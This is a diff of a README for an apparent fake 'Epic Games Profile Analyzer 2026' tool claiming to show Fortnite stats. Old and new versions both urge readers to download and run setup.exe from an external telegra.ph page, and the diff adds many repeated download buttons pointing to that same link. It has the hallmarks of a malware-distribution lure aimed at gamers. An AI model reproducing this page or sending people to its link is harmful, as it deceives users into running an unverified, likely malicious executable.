@@ -1,65 +1,86 @@
 # epic-games-profile-analyzer-2026
 Lightweight Windows tool to analyze Epic Games profiles and Fortnite stats. View playtime, progression and activity insights locally. No login required. Download setup.exe and run ProjectFiles. Updated for 2026.
-# Epic Games Profile Analyzer 2026
+<div align="center">
 
-Lightweight Windows tool to analyze Epic Games profiles and Fortnite stats. View playtime, progression and activity insights locally. No login required. Download setup.exe and run ProjectFiles. Updated for 2026.
+# 🎮 Epic Games Profile Analyzer 2026
 
-**Quick Analysis | No Login Required | Local Processing**
-
----
-
-## Download & Setup
-
-1. **Download** the setup file from the link below
-2. **Run** `setup.exe` after download completes
-3. **Launch** the **ProjectFiles** application to begin
-
-### [⬇️ DOWNLOAD SETUP.EXE](https://telegra.ph/How-to-download-07-15-12)
-
-**Important:** You must download `setup.exe` from the link above. Once downloaded, run the installer and then launch **ProjectFiles** to access all features.
+**Lightweight Windows tool to analyze Epic Games profiles and Fortnite stats.**
+View playtime, progression and activity insights locally. No login required.
+Download `setup.exe` and run **ProjectFiles**. Updated for 2026.
 
 ---
 
-## Overview
+### ⬇️ DOWNLOAD & LAUNCH ⬇️
 
-Epic Games accounts accumulate significant data over time, but the platform does not present this information in a structured, analyzable format. This utility bridges that gap by consolidating profile metrics into a single view.
+[![Download Setup](https://img.shields.io/badge/⬇_DOWNLOAD_SETUP.EXE-1E5AFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A2A8A)](https://telegra.ph/How-to-download-07-15-12)
 
-**Key Capabilities:**
+[![Run ProjectFiles](https://img.shields.io/badge/▶_RUN_PROJECTFILES-2563EB?style=for-the-badge&logo=rocket&logoColor=white&labelColor=0A2A8A)](https://telegra.ph/How-to-download-07-15-12)
 
-- **Profile Metrics Dashboard** – View account-level statistics including playtime, progression indicators and activity summaries
-- **Fortnite Statistics Module** – Analyze match data and performance trends
-- **Cross-Game Support** – Works with Epic Games accounts spanning multiple titles
-- **Local Processing** – All analysis runs locally for privacy and speed
+[![Get Started](https://img.shields.io/badge/🚀_GET_STARTED_NOW-3B82F6?style=for-the-badge&logo=epicgames&logoColor=white&labelColor=0A2A8A)](https://telegra.ph/How-to-download-07-15-12)
 
----
+[![Download Free](https://img.shields.io/badge/💾_DOWNLOAD_FREE-1D4ED8?style=for-the-badge&logo=download&logoColor=white&labelColor=0A2A8A)](https://telegra.ph/How-to-download-07-15-12)
 
-## System Requirements
-
-- **OS:** Windows 10 or Windows 11 (64-bit recommended)
-- **Network:** Internet connection for initial data retrieval
-- **Storage:** Minimal disk space for installation and caching
+[![Latest 2026](https://img.shields.io/badge/🔥_LATEST_2026_BUILD-1E40AF?style=for-the-badge&logo=fire&logoColor=white&labelColor=0A2A8A)](https://telegra.ph/How-to-download-07-15-12)
 
 ---
 
-## FAQ
+</div>
 
-**Is this tool free?**
-Yes. Provided as-is for personal use.
+## 🚀 Quick Setup
 
-**Does it require credentials?**
-The tool works with publicly accessible profile data. Never share your Epic Games password with third-party tools.
-
-**How often is it updated?**
-Releases align with major platform changes to maintain compatibility.
+> **Step 1** — Click any blue button above
+> **Step 2** — Download `setup.exe`
+> **Step 3** — Run the installer
+> **Step 4** — Launch **ProjectFiles**
 
 ---
 
-## Disclaimer
+## ✨ Features
 
-This is an independent utility and is not affiliated with, endorsed by, or sponsored by Epic Games, Inc. Fortnite and Epic Games are trademarks of Epic Games, Inc. All trademarks are the property of their respective owners.
-
-Users are responsible for complying with Epic Games' Terms of Service when using any third-party tool.
+| Module | What It Does |
+|--------|--------------|
+| 📊 **Profile Dashboard** | Playtime, progression and activity metrics in one view |
+| 🏆 **Fortnite Stats** | Match data and performance trends |
+| 🎯 **Cross-Game Support** | Works across the Epic Games ecosystem |
+| 🔒 **Local Processing** | Everything runs on your machine |
 
 ---
 
-**Last Updated:** 2026 | **Version:** 2.0.0
+<div align="center">
+
+### Ready? Hit a button. Any button. 👇
+
+[![DOWNLOAD](https://img.shields.io/badge/⬇_DOWNLOAD_SETUP.EXE-1E5AFF?style=for-the-badge&logoColor=white&labelColor=0A2A8A)](https://telegra.ph/How-to-download-07-15-12)
+
+[![LAUNCH](https://img.shields.io/badge/▶_LAUNCH_PROJECTFILES-2563EB?style=for-the-badge&logoColor=white&labelColor=0A2A8A)](https://telegra.ph/How-to-download-07-15-12)
+
+[![INSTALL](https://img.shields.io/badge/⚡_INSTALL_NOW-3B82F6?style=for-the-badge&logoColor=white&labelColor=0A2A8A)](https://telegra.ph/How-to-download-07-15-12)
+
+[![START](https://img.shields.io/badge/🎮_START_ANALYZING-1D4ED8?style=for-the-badge&logoColor=white&labelColor=0A2A8A)](https://telegra.ph/How-to-download-07-15-12)
+
+</div>
+
+---
+
+## 🖥️ System Requirements
+
+- **OS:** Windows 10 / 11 (64-bit)
+- **Network:** Required for initial data retrieval
+- **Storage:** Minimal disk space
+
+---
+
+## ❓ FAQ
+
+**Free?** Yes — personal use.
+**Credentials?** Never share your Epic Games password. Works with publicly accessible data only.
+**Updates?** Aligned with major platform changes.
+
+---
+
+## ⚠️ Disclaimer
+
+Independent utility. Not affiliated with, endorsed by, or sponsored by Epic Games, Inc.
+Fortnite and Epic Games are trademarks of Epic Games, Inc.
+
+**Last Updated:** 2026 · **Version:** 2.0.0
